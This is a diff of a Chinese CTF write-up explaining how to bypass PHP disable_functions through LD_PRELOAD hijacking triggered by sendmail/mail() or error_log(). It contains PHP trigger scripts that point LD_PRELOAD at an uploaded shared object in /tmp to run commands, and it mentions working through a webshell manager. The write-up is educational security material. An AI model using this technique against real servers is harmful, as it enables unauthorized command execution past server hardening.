@@ -29,7 +29,7 @@
 <p>这里常用的有两种方式：<code>Sendmail+LD_PRELOAD</code>和<code>error_log+LD_PRELOAD</code>，如果服务端没有禁止<code>mail</code>的使用，就可以用前者，反之可以使用后者。</p>
 <p><strong>Sendmail+LD_PRELOAD</strong>：sendmail会调用<code>geteuid()</code>，因此可以进行劫持，详细知识参考<a href="https://blog.csdn.net/xia739635297/article/details/104641082/" target="_blank" rel="noopener">这里</a>。</p>
 <p>触发脚本如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    <span class="comment">//gnupg_init();</span></span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>将<code>so</code>文件传到<code>/tmp</code>文件夹是因为这个文件夹用户是可以进行写入的，自己也可以找别的文件夹来灵活构造。</p>
 <p><strong>error_log+LD_PRELOAD</strong>：当题目环境不支持<code>mail</code>的时候，即可利用<code>error_log</code>来触发劫持，本题就需要用这种方法。</p>
@@ -57,11 +57,11 @@
 
 <p><img src="http://www.ggb0n.cool/images/ctfhub07.png" alt=""></p>
 <p>同时用上述的代码构造好触发的php脚本：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//putenv("cmd=ls &gt; hackfile");</span></span><br><span class="line">	putenv(<span class="string">"cmd=/readflag &gt; hackfile"</span>);</span><br><span class="line">	putenv(<span class="string">"LD_PRELOAD=/tmp/ld_preload.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//putenv("cmd=ls &gt; hackfile");</span></span><br><span class="line">    putenv(<span class="string">"cmd=/readflag &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/ld_preload.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>把<code>so</code>文件上传到<code>/tmp/</code>文件夹下，触发脚本上传到<code>/var/www/html/</code>下</p>
 <p>然后在浏览器访问我们写入的触发脚本，然后回到蚁剑查看效果：</p>
-<p><img src="http://www.ggb0n.cool/images/ctfhub9.png" alt=""></p>
+<p><img src="http://www.ggb0n.cool/images/ctfhub09.png" alt=""></p>
 <p>可以看到<code>hackfile</code>文件已经存在了，打开即可拿到flag</p>
 <p><img src="http://www.ggb0n.cool/images/ctfhub10.png" alt=""></p>
 <p><strong>持续更新。。。</strong></p>
